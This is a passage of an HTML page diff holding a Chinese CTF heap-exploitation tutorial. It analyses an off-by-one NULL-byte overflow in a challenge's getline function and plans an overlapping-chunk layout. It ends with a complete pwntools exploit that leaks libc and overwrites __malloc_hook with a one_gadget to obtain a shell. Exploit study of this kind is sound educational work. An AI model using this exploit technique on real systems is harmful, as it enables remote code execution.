+  v4 = malloc_usable_size(v2); // 计算了可用大小，例如对于 malloc(8) 来说，这里应该为24
+  while ( 1 )
+  {
+    v5 = _IO_getc(stdin);
+    v6 = v5;
+    if ( v5 == -1 )
+      bye();
+    if ( v5 == 10 )
+      break;
+    v7 = v3 - v2;
+    if ( v4 &lt;= v3 - v2 )
+    {
+      v8 = (char *)realloc(v2, 2 * v4); // 大小不够是将可用大小乘二，进行 realloc
+      v2 = v8;
+      if ( !v8 )
+      {
+        puts(&quot;FATAL: Out of memory&quot;);
+        exit(-1);
+      }
+      v3 = &amp;v8[v7];
+      v4 = malloc_usable_size(v8);
+    }
+    *v3++ = v6; // &lt;--- 漏洞所在，此时 v3 作为索引，指向了下一个位置，如果位置全部使用完毕则会指向下一个本应该不可写位置 
+  }
+  *v3 = 0; // &lt;--- 漏洞所在。 off by one （NULL 字节溢出）
+  return v2;
+}
+</pre></div>
+
+<p>几个主要功能：</p>
+<div class="codehilite"><pre><span></span>unsigned __int64 main_fn()
+{
+  char v1[8]; // [rsp+0h] [rbp-18h]
+  unsigned __int64 v2; // [rsp+8h] [rbp-10h]
+
+  v2 = __readfsqword(0x28u);
+  puts(&quot;PROMPT: Enter command:&quot;);
+  gets_checked(v1, 8LL);
+  if ( !strcmp(v1, &quot;GET\n&quot;) )
+  {
+    cmd_get();
+  }
+  else if ( !strcmp(v1, &quot;PUT\n&quot;) )
+  {
+    cmd_put();
+  }
+  else if ( !strcmp(v1, &quot;DUMP\n&quot;) )
+  {
+    cmd_dump();
+  }
+  else if ( !strcmp(v1, &quot;DEL\n&quot;) )
+  {
+    cmd_del();
+  }
+  else
+  {
+    if ( !strcmp(v1, &quot;EXIT\n&quot;) )
+      bye();
+    __printf_chk(1LL, &quot;ERROR: &#39;%s&#39; is not a valid command.\n&quot;, v1);
+  }
+  return __readfsqword(0x28u) ^ v2;
+}
+</pre></div>
+
+<p><code>dump</code> 和 <code>get</code> 都是用来读取内容，这样 <code>key</code> 和具体数据内容都可以读取，不太需要重点关注。重点关注 <code>put</code> 和 <code>del</code>：</p>
+<div class="codehilite"><pre><span></span>__int64 __fastcall cmd_put()
+{
+  __int64 v0; // rsi
+  Node *row; // rbx
+  unsigned __int64 sz; // rax
+  char *v3; // rax
+  __int64 v4; // rbp
+  __int64 result; // rax
+  __int64 v6; // [rsp+0h] [rbp-38h]
+  unsigned __int64 v7; // [rsp+18h] [rbp-20h]
+
+  v7 = __readfsqword(0x28u);
+  row = (Node *)malloc(0x38uLL);
+  if ( !row )
+  {
+    puts(&quot;FATAL: Can&#39;t allocate a row&quot;);
+    exit(-1);
+  }
+  puts(&quot;PROMPT: Enter row key:&quot;);
+  row-&gt;key = getline((__int64)&quot;PROMPT: Enter row key:&quot;, v0);
+  puts(&quot;PROMPT: Enter data size:&quot;);
+  gets_checked((char *)&amp;v6, 16LL);
+  sz = strtoul((const char *)&amp;v6, 0LL, 0);
+  row-&gt;data_size = sz;
+  v3 = (char *)malloc(sz);
+  row-&gt;data = v3;
+  if ( v3 )
+  {
+    puts(&quot;PROMPT: Enter data:&quot;);
+    fread_checked(row-&gt;data, row-&gt;data_size);
+    v4 = insert_node(row);
+    if ( v4 )
+    {
+      free(row-&gt;key);
+      free(*(void **)(v4 + 16));
+      *(_QWORD *)(v4 + 8) = row-&gt;data_size;
+      *(_QWORD *)(v4 + 16) = row-&gt;data;
+      free(row);
+      puts(&quot;INFO: Update successful.&quot;);
+    }
+    else
+    {
+      puts(&quot;INFO: Insert successful.&quot;);
+    }
+    result = __readfsqword(0x28u) ^ v7;
+  }
+  else
+  {
+    puts(&quot;ERROR: Can&#39;t store that much data.&quot;);
+    free(row-&gt;key);
+    free(row);
+  }
+  return result;
+}
+</pre></div>
+
+<p>分配过程有：</p>
+<ol>
+<li>malloc(0x38) (结构体)</li>
+<li>getline (malloc 和 realloc)</li>
+<li>malloc(size) 可控大小</li>
+<li>读入 size 字节内容</li>
+</ol>
+<p>更复杂的部分我们可以之后在看是否会用到，也就是在 put 中用到的关于 <code>free</code> 的部分</p>
+<p>对于删除来说，这个函数比较复杂，就不再详细解释。事实上只需要知道他是按照 key 来进行删除，key 则使用 <code>getline</code> 进行读取，如果没有该 key，则 <code>getline</code> 的部分不会被删除，有的话，就依次 <code>free</code></p>
+<h3 id="_9">漏洞利用分析<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
+<p>漏洞的位置在功能分析中已经指出来了，在 <code>getline</code> 当中，但是这个函数比较特殊的地方在于，它所分配的大小是逐渐增大的，通过可用大小乘二的方式增大，使用了 <code>realloc</code>，也就是说，我们想要触发这个漏洞，就需要满足特定大小的要求。</p>
+<p>根据分配过程，满足的大小有：</p>
+<ul>
+<li>0x18</li>
+<li>0x38</li>
+<li>0x78</li>
+<li>0xf8</li>
+<li>0x1f8</li>
+<li>...</li>
+</ul>
+<p>这些大小都可以触发溢出。</p>
+<p>现在我们就需要知道我们需要采用的具体利用方法了。首先 <code>off-by-one</code> 漏洞可以造成堆交叉，可以造成 libc 地址泄露，之后所要采用的利用方法，由于已经存在堆交叉，也就是可以形成 UAF ，可以使用 UAF 的常用方法。</p>
+<p>UAF 漏洞最简单的方法当然是 fastbin attack 了，所以我采用了 fastbin attack。</p>
+<p>到这里，我们就可以开始思考如何形成我们所需要的利用条件。<code>off-by-one</code>最终的效果是可以将一个释放状态的 smallbin chunk 或是 unsortedbin chunk 一直到被溢出 chunk 合并成一个大 chunk。也就是说：</p>
+<div class="codehilite"><pre><span></span>+------------+
+|            |  &lt;-- free 的 unsortedbin 或是 smallbin chunk （因为此时 fd 和 bk 指向合法指针，才能够进行 unlink）
++------------+
+|     ...    |  &lt;-- 任意 chunk
++------------+
+|            |  &lt;-- 进行溢出的 chunk
++------------+
+|    vuln    |  &lt;-- 被溢出的 chunk，大小为 0x_00 （例如 0x100, 0x200……）
++------------+
+</pre></div>
+
+<p>在 <code>off-by-one</code> 利用后，以上出现的 chunk 都将被合并为一个释放状态的 chunk。这样中间任意 chunk 的位置如果是已被分配的，就可以造成 overlap 了。</p>
+<p>按照我们的利用思路，结合题目 <code>getline</code> 函数通过 <code>malloc(8)</code> 再 <code>realloc</code> 的分配方式，我们需要：</p>
+<ol>
+<li>任意 chunk 位置至少有一个已经被分配，且可以读出数据的 chunk 来泄露 libc 地址</li>
+<li>进行溢出的 chunk 需要在最上方的 chunk 之前被分配，否则 <code>malloc(8)</code> 的时候会分配到最上方而不是进行溢出 chunk 应在的位置</li>
+<li>任意 chunk 位置至少还需要有一个已经被释放，且 size 为 0x71 的 chunk 来进行 fastbin attack</li>
+<li>所有 chunk 不应该被合并进 top，所以最下方应该有一个已经分配的 chunk 保证与 top chunk 的距离</li>
+<li>进行溢出的 chunk 大小应该属于 unsortedbin 或是 smallbin，不能为 fastbin，否则被释放之后，按照 <code>getline</code> 的分配方式，<code>malloc(8)</code> 无法分配在该位置</li>
+</ol>
+<p>按照以上原则，我们可以思考出 chunk 的分布如下：</p>
+<div class="codehilite"><pre><span></span>+------------+
+|      1     |  &lt;-- free 的 size == 0x200 chunk
++------------+
+|      2     |  &lt;-- size == 0x60 fastbin chunk，已被分配，且可以读出数据
++------------+
+|      5     |  &lt;-- size == 0x71 fastbin chunk，为 fastbin attack 做准备
++------------+
+|      3     |  &lt;-- size == 0x1f8 free 状态的 smallbin/unsortedbin chunk
++------------+
+|      4     |  &lt;-- size == 0x101 被溢出 chunk
++------------+
+|      X     |  &lt;-- 任意分配后 chunk 防止 top 合并
++------------+
+</pre></div>
+
+<p>由于分配过程还有一些额外结构（结构体本身的分配和 <code>getline</code>），我们需要先释放出足够的 fastbin chunk 来避免结构体本身的分配对我们的过程造成影响。</p>
+<p>在此之后，依次释放掉 5, 3, 1, 之后利用 <code>del</code> 输入时候的 <code>getline</code>，将 3 填满，造成 <code>off-by-one</code>，之后将 4 <code>free</code> 掉进行合并（伪造 <code>prev_size</code>），这样就有了一个交叉的堆结构了。</p>
+<p>之后的过程就更加简单了，首先分配 1 的大小，使得 libc 地址被写到 2 里，就可以泄露出地址，然后将 5 分配出来，写入需要的内容，就可以 fastbin attack 了。</p>
+<h3 id="exploit_1">exploit<a class="headerlink" href="#exploit_1" title="Permanent link">&para;</a></h3>
+<p>由于原 libc 为 2.19 版本，加载有一些奇怪的问题，较为麻烦，而本题没有用到 2.19 独有的特性，所以我采用了 2.23 的 libc 进行调试，版本为 ubuntu10。</p>
+<div class="codehilite"><pre><span></span><span class="ch">#! /usr/bin/env python2</span>
+<span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="c1"># vim:fenc=utf-8</span>
+
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">os.path</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">:</span>
+    <span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="n">HOST</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="n">PORT</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">DEBUG</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
+        <span class="n">PATH</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">PATH</span><span class="p">)</span>
+
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span><span class="p">)</span> <span class="c1"># ubuntu 16.04</span>
+
+<span class="k">def</span> <span class="nf">cmd</span><span class="p">(</span><span class="n">command_num</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;command:&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">command_num</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">put</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;PUT&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;size:&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;data:&#39;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">p</span><span class="o">.</span><span class="n">s</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;DEL&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">get</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;key:&#39;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;[&#39;</span><span class="p">)</span>
+    <span class="n">num</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39; bytes&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">&#39; bytes&#39;</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="c1"># avoid complicity of structure malloc</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">put</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="mh">0x38</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+        <span class="n">delete</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>
+
+    <span class="c1"># allocate what we want in order</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;6&#39;</span><span class="p">)</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">,</span> <span class="mh">0x1f8</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="s1">&#39;4&#39;</span><span class="p">)</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;defense&#39;</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="s1">&#39;defense-data&#39;</span><span class="p">)</span>
+
+
+    <span class="c1"># free those need to be freed</span>
+    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;5&#39;</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+
+    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x1f0</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4e0</span><span class="p">))</span>
+
+    <span class="n">delete</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
+
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;0x200&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;fillup&#39;</span><span class="p">)</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;0x200 fillup&#39;</span><span class="p">,</span> <span class="mh">0x200</span><span class="p">,</span> <span class="s1">&#39;fillup again&#39;</span><span class="p">)</span>
+
+    <span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc leak: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc_leak</span><span class="p">)</span>
+
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x3c4b78</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;libc_base: 0x</span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">libc_base</span><span class="p">)</span>
+
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;fastatk&#39;</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mh">0x58</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x71</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__malloc_hook&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="mi">5</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;prepare&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;prepare data&#39;</span><span class="p">)</span>
+
+    <span class="n">one_gadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x4526a</span>
+    <span class="n">put</span><span class="p">(</span><span class="s1">&#39;attack&#39;</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">))</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;DEL&#39;</span><span class="p">)</span> <span class="c1"># malloc(8) triggers one_gadget</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</pre></div>
                 
                   
                 
